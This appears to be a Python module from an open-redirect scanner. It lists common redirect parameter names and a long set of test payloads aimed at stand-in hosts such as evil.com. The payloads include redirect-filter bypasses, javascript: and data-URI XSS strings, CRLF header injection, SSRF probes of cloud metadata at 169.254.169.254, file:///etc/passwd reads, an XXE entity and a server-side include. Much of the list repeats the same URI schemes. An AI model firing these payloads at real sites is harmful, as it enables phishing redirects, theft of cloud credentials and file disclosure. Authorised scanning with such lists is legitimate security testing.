# Common redirect parameters to look for
REDIRECT_PARAMS = [
    "redirect",
    "redirect_uri",
    "redirect_url",
    "redirect_to",
    "redir",
    "rurl",
    "url",
    "next",
    "next_url",
    "target",
    "target_url",
    "return",
    "return_url",
    "return_to",
    "returnTo",
    "destination",
    "dest",
    "continue",
    "continue_url",
    "checkout_url",
    "callback",
    "callback_url",
    "forward",
    "forward_url",
    "link",
    "link_url",
    "file",
    "page",
    "uri",
    "path",
    "go",
    "out",
    "view",
    "dir",
    "show",
    "navigation",
    "open",
    "load",
    "from_url",
    "to_url",
    "exit_url",
    "exit",
    "ret",
    "ret_url",
    "returnto",
    "return_path",
    "checkout",
    "image_url",
    "domain",
    "u",
    "r",
    "n",
    "m",
    "l",
    "j",
    "q",
    "src",
    "source",
    "ref",
    "referer",
    "referrer",
    "login_url",
    "logout_url",
    "signin_url",
    "signout_url",
    "register_url",
    "success_url",
    "failure_url",
    "error_url",
    "cancel_url",
    "home_url",
    "dashboard_url",
    "profile_url",
    "settings_url",
    "admin_url",
    "api_url",
    "service_url",
    "endpoint",
    "feed_url",
    "download_url",
    "upload_url",
    "share_url",
    "widget_url",
    "external_url",
    "internal_url",
    "back_url",
    "previous_url",
    "following_url",
    "follow_url",
    "jump",
    "jump_url",
    "jump_to",
    "location",
    "data",
    "file_url",
    "filename",
    "folder",
    "folder_url",
    "path_url",
    "relative_url",
    "absolute_url",
    "base_url",
    "host",
    "host_url",
    "origin",
    "origin_url",
    "port",
    "protocol",
    "scheme"
]

# Open redirect payloads to test
PAYLOADS = [
    # Basic payloads
    "http://evil.com",
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "\\evil.com",
    
    # Protocol manipulations
    "http://attacker.com@evil.com",
    "https://attacker.com@evil.com",
    "http://evil.com#@attacker.com",
    "https://evil.com#@attacker.com",
    "http://evil.com?@attacker.com",
    "https://evil.com?@attacker.com",
    
    # JavaScript payloads
    "javascript:alert(1)",
    "javascript://evil.com/%0aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    
    # Special characters
    "http://evil.com\\t.example.com",
    "http://evil.com\\n.example.com",
    "http://evil.com\\r.example.com",
    "http://evil.com\\0.example.com",
    
    # URL encoded payloads
    "http%3A%2F%2Fevil.com",
    "%2F%2Fevil.com",
    "%5Cevil.com",
    "http:%0A%0Devil.com",
    
    # Bypass techniques
    "http://evil.com/?@example.com",
    "http://evil.com/.example.com",
    "http://evil.com\\example.com",
    "http://evil.com\\\\example.com",
    "http://evil.com//example.com",
    "http://evil.com///example.com",
    
    # Domain tricks
    "http://evil.com.example.com",
    "http://evil.com@example.com",
    "http://example.com.evil.com",
    "http://evil.com?example.com",
    "http://evil.com#example.com",
    
    # IP addresses
    "http://127.0.0.1",
    "http://2130706433",  # 127.0.0.1 in decimal
    "http://0x7f000001",  # 127.0.0.1 in hex
    
    # Localhost variations
    "http://localhost",
    "http://localhost:80@evil.com",
    "http://127.0.0.1:80@evil.com",
    
    # Data URI
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    
    # CRLF injection
    "http://evil.com%0d%0aLocation:%20http://attacker.com",
    "http://evil.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLocation:%20http://attacker.com",
    
    # SSRF payloads
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://[::]",
    
    # Unicode tricks
    "http://ⓔⓥⓘⓛ.ⓒⓞⓜ",
    "http://evil。com",
    "http://evil．com",
    "http://evil｡com",
    
    # Whitelist bypasses
    "http://example.com.evil.com",
    "http://evil.com?example.com",
    "http://evil.com#example.com",
    "http://example.com@evil.com",
    "http://evil.com\\example.com",
    
    # Relative URLs
    "/redirect?url=//evil.com",
    "/\\evil.com",
    "\\/evil.com",
    
    # HTML entities
    "http://&amp;evil.com",
    "http://&#x65;vil.com",
    
    # Null bytes
    "http://evil.com%00.example.com",
    "http://evil.com%2500.example.com",
    
    # Double encoding
    "http://%2565vil.com",
    "http://%2525252565vil.com",
    
    # Browser-specific quirks
    "http://evil.com:80\\@example.com",
    "http://evil.com:80:\\@example.com",
    "http://evil.com:80#@example.com",
    
    # OAuth/SAML specific
    "http://evil.com/.well-known/openid-configuration",
    "http://evil.com/saml2/idp/metadata.php",
    
    # Mobile app deep links
    "android-app://evil.com",
    "ios-app://evil.com",
    
    # Special protocols
    "tel:+123456789",
    "mailto:attacker@evil.com",
    "sms:+123456789?body=evil",
    "whatsapp://send?text=evil",
    
    # File paths
    "file:///etc/passwd",
    "file://evil.com/etc/passwd",
    
    # Chrome extensions
    "chrome-extension://evil.com",
    
    # Windows UNC paths
    "\\\\evil.com\\share",
    "\\\\?\\evil.com",
    
    # DNS rebinding
    "http://evil.com:80@169.254.169.254",
    "http://evil.com:80@localhost",
    
    # Cloud metadata endpoints
    "http://metadata.google.internal",
    "http://169.254.169.254/latest/meta-data",
    
    # Advanced obfuscation
    "http://evil.com\\t.example.com",
    "http://evil.com%09.example.com",
    "http://evil.com%0a.example.com",
    "http://evil.com%0d.example.com",
    
    # Domain fronting
    "http://evil.com.example.com",
    "http://example.com.evil.com",
    
    # Internationalized domain names
    "http://evil.com.ⓔⓥⓘⓛ",
    "http://evil.com。example.com",
    
    # Special cases
    "http://evil.com:80\\example.com",
    "http://evil.com:80:\\example.com",
    "http://evil.com:80#example.com",
    
    # Bypass filters with tabs/newlines
    "http://evil.com\t.example.com",
    "http://evil.com\n.example.com",
    "http://evil.com\r.example.com",
    
    # Mixed case
    "hTtP://eVil.cOm",
    "HtTpS://eViL.CoM",
    
    # Long URLs to bypass filters
    "http://evil.com/" + ("a" * 1000),
    "http://evil.com?" + ("a" * 1000),
    
    # URL shortener bypass
    "http://bit.ly/evil",
    "http://goo.gl/evil",
    
    # JSONP callback
    "http://example.com?callback=http://evil.com",
    
    # Open Graph URL
    "http://example.com?og:url=http://evil.com",
    
    # SWF files
    "http://example.com/file.swf?url=http://evil.com",
    
    # PDF embedding
    "http://example.com/file.pdf?file=http://evil.com",
    
    # SVG XSS
    "http://example.com/image.svg?url=javascript:alert(1)",
    
    # Markdown links
    "[Click me](http://evil.com)",
    
    # Iframe injection
    "<iframe src='http://evil.com'></iframe>",
    
    # CSS import
    "@import url(http://evil.com);",
    
    # XML external entity
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com'>]>",
    
    # Server-side includes
    "<!--#include virtual='http://evil.com' -->",
    
    # WebSocket
    "ws://evil.com",
    "wss://evil.com",
    
    # RTMP
    "rtmp://evil.com",
    
    # MQTT
    "mqtt://evil.com",
    
    # CoAP
    "coap://evil.com",
    
    # DNS
    "dns://evil.com",
    
    # LDAP
    "ldap://evil.com",
    
    # JDBC
    "jdbc:mysql://evil.com",
    
    # Redis
    "redis://evil.com",
    
    # MongoDB
    "mongodb://evil.com",
    
    # SMTP
    "smtp://evil.com",
    
    # SSH
    "ssh://evil.com",
    
    # Git
    "git://evil.com",
    
    # SVN
    "svn://evil.com",
    
    # Mercurial
    "hg://evil.com",
    
    # FTP
    "ftp://evil.com",
    
    # SFTP
    "sftp://evil.com",
    
    # SMB
    "smb://evil.com",
    
    # NFS
    "nfs://evil.com",
    
    # WebDAV
    "webdav://evil.com",
    
    # IMAP
    "imap://evil.com",
    
    # POP3
    "pop3://evil.com",
    
    # IRC
    "irc://evil.com",
    
    # XMPP
    "xmpp://evil.com",
    
    # SIP
    "sip://evil.com",
    
    # H323
    "h323://evil.com",
    
    # STUN
    "stun://evil.com",
    
    # TURN
    "turn://evil.com",
    
    # Bitcoin
    "bitcoin://evil.com",
    
    # Ethereum
    "ethereum://evil.com",
    
    # Ripple
    "ripple://evil.com",
    
    # Magnet
    "magnet:?xt=urn:btih:evil",
    
    # Steam
    "steam://evil.com",
    
    # Spotify
    "spotify://evil.com",
    
    # iTunes
    "itunes://evil.com",
    
    # Facetime
    "facetime://evil.com",
    
    # Skype
    "skype://evil.com",
    
    # Zoom
    "zoommtg://evil.com",
    
    # Slack
    "slack://evil.com",
    
    # Discord
    "discord://evil.com",
    
    # Teams
    "msteams://evil.com",
    
    # Viber
    "viber://evil.com",
    
    # WhatsApp
    "whatsapp://evil.com",
    
    # Telegram
    "tg://evil.com",
    
    # Signal
    "signal://evil.com",
    
    # Threema
    "threema://evil.com",
    
    # Wire
    "wire://evil.com",
    
    # Matrix
    "matrix://evil.com",
    
    # Jitsi
    "jitsi://evil.com",
    
    # Custom schemes
    "custom://evil.com",
    "myapp://evil.com",
    "internal://evil.com",
    "local://evil.com",
    "secure://evil.com",
    "api://evil.com",
    "mobile://evil.com",
    "web://evil.com",
    "app://evil.com",
    "intent://evil.com",
    "content://evil.com",
    "file://evil.com",
    "asset://evil.com",
    "res://evil.com",
    "about://evil.com",
    "blob://evil.com",
    "data://evil.com",
    "view-source://evil.com",
    "ws://evil.com",
    "wss://evil.com",
    "ftp://evil.com",
    "sftp://evil.com",
    "smb://evil.com",
    "nfs://evil.com",
    "webdav://evil.com",
    "git://evil.com",
    "svn://evil.com",
    "hg://evil.com",
    "ssh://evil.com",
    "telnet://evil.com",
    "imap://evil.com",
    "pop3://evil.com",
    "smtp://evil.com",
    "irc://evil.com",
    "xmpp://evil.com",
    "mumble://evil.com",
    "sip://evil.com",
    "h323://evil.com",
    "stun://evil.com",
    "turn://evil.com",
    "bitcoin://evil.com",
    "ethereum://evil.com",
    "ripple://evil.com",
    "magnet://evil.com",
    "steam://evil.com",
    "spotify://evil.com",
    "itunes://evil.com",
    "facetime://evil.com",
    "skype://evil.com",
    "zoommtg://evil.com",
    "slack://evil.com",
    "discord://evil.com",
    "msteams://evil.com",
    "viber://evil.com",
    "whatsapp://evil.com",
    "tg://evil.com",
    "signal://evil.com",
    "threema://evil.com",
    "wire://evil.com",
    "matrix://evil.com",
    "jitsi://evil.com"
]

def get_payloads_for_param(param: str) -> List[str]:
    """
    Get appropriate payloads for a specific parameter
    :param param: Parameter name
    :return: List of payloads to test
    """
    # Special handling for certain parameter types
    if param.lower() in ['callback', 'jsonp']:
        return [p for p in PAYLOADS if 'javascript' in p or 'alert' in p]
    elif param.lower() in ['file', 'path', 'src']:
        return [p for p in PAYLOADS if 'file://' in p or '/etc/passwd' in p]
    else:
        return PAYLOADS
